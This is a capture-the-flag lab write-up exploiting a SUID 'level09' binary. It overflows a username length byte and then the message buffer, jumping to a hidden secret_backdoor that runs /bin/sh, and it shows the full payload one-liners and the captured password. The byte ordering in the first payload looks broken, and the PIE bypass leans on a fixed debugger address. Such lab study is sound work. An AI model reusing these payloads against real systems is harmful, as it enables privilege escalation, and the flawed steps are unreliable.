# Level09 — Buffer Overflow with PIE Bypass & Hidden Function Exploitation

## Context

Inside the home directory of the `level09` user, we find a binary named `level09`.
The program implements a messaging system that collects username and message input from users.
Our objective is to exploit buffer overflow vulnerabilities while bypassing Position Independent Executable (PIE) protection to execute a hidden backdoor function.

---

## Initial Environment — Directory Listing

```bash
$ ls -la
total 17
dr-xr-x---+ 1 end end   80 Oct  2  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 end end  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level09 level09 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 end users   12288 Sep 10  2016 level09
-rw-r--r--  1 end end  675 Sep 10  2016 .profile
```

> **Note:** the binary `level09` has the **SUID** bit set (`rws`), so it runs with the privileges of its owner (`end`).

---

## Security Analysis

```bash
$ checksec --file ./level09
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   ./level09
```

**Key security features:**
* **Partial RELRO** → GOT partially writable
* **No stack canary** → Stack buffer overflow protection disabled
* **NX enabled** → Stack not executable (no shellcode execution)
* **PIE enabled** → Randomized memory layout, unpredictable addresses

---

## Running the Binary

```bash
$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: test
>: Welcome, test
>: Msg @Unix-Dude
>>: hello world
>: Msg sent!
```

The program implements a simple messaging interface with username and message input.

---

## Static Analysis (Disassembly)

**Program Flow Analysis:**

### Main Function
```asm
0x0000000000000aa8 <+0>:    push   %rbp
0x0000000000000ab3 <+11>:   callq  0x730 <puts@plt>      ; Welcome banner
0x0000000000000ab8 <+16>:   callq  0x8c0 <handle_msg>    ; Main functionality
```

### Handle Message Function
```asm
0x00000000000008c4 <+4>:    sub    $0xc0,%rsp            ; Stack space allocation
0x0000000000000910 <+80>:   callq  0x9cd <set_username>  ; Username input
0x000000000000091f <+95>:   callq  0x932 <set_msg>       ; Message input
```

### Set Username Function
```asm
0x00000000000009d1 <+4>:    sub    $0xa0,%rsp            ; 160-byte stack allocation
0x0000000000000a38 <+107>:  callq  0x770 <fgets@plt>     ; Read 128 bytes into local buffer
0x0000000000000a5f <+146>:  mov    %cl,0x8c(%rdx,%rax,1) ; Copy to structure offset 0x8c
```

### Set Message Function  
```asm
0x0000000000000936 <+4>:    sub    $0x410,%rsp           ; 1040-byte stack allocation
0x0000000000000995 <+99>:   mov    $0x400,%esi           ; Read up to 1024 bytes
0x000000000000099d <+107>:  callq  0x770 <fgets@plt>     ; Input into local buffer
0x00000000000009c6 <+148>:  callq  0x720 <strncpy@plt>   ; Copy to structure
```

### Hidden Function Discovery
```bash
(gdb) i fun
0x000000000000088c  secret_backdoor
```

```asm
0x000000000000088c <+0>:    push   %rbp
0x00000000000008ad <+33>:   callq  0x770 <fgets@plt>     ; Read command
0x00000000000008b9 <+45>:   callq  0x740 <system@plt>    ; Execute command!
```

**Critical observations:**
* Username limited to 40 characters, copied to structure at offset 0x8c
* Message can be up to 1024 characters
* Hidden `secret_backdoor` function executes arbitrary commands

---

## Vulnerability Analysis

### Buffer Overflow in Username

Testing username input length:

```bash
$ ./level09
>>: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9...
>: Welcome, Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2>: Msg @Unix-Dude
```

Username truncation occurs around 40 characters, but affects subsequent program flow.

### Buffer Overflow in Message

Testing message input with cyclic pattern:

```bash
(gdb) run
>>: test
>>: [Long cyclic pattern]

Program received signal SIGSEGV, Segmentation fault.
0x4138674137674136 in ?? ()
```

**Message buffer overflow confirmed:**
* Pattern `0x4138674137674136` corresponds to "6Ag7Ag8" in cyclic input
* **Overflow offset:** Approximately 200 bytes to control return address

---

## PIE Bypass Strategy

### Address Space Layout Randomization Challenge

With PIE enabled, function addresses change on each execution:

```bash
(gdb) b main 
Breakpoint 1 at 0xaac
(gdb) run
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) i fun secret_backdoor 
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor

```

---

## Exploitation Development

### Step 1: PIE Base Address Leak

Overflow username to leak adjacent memory containing function pointers:

```bash
$ python -c 'print "A" * 40 + "\xDC"'
```

The `\xDC` byte overwrites the length field, causing more data to be copied and displayed.

### Step 2: Address Calculation

From the leaked addresses, calculate the PIE base and `secret_backdoor` address:

```python
# Example leaked address: 0x555555554abc
# PIE base = leaked_address - known_offset
# secret_backdoor = PIE_base + 0x88c
```

### Step 3: Return Address Overwrite

Overflow the message buffer to control the return address:

```bash
PAYLOAD = "A" * 200 + secret_backdoor_address
```

---

## Exploitation

### Method 1: Static Address Calculation

Using knowledge of the binary layout, construct payload with calculated address:

```bash
$ (python -c 'print "a" * 40 + "\xDC" + "\n" + "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"[::-1] + "/bin/sh"'; cat) | ./level09
```

### Method 2: Runtime Address Resolution

The successful exploitation shows:

```bash
$ (python -c 'print "a" * 40 + "\xDC" + "\n" + "a" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

**Success:** Shell access with `end` privileges and final password extraction!

---
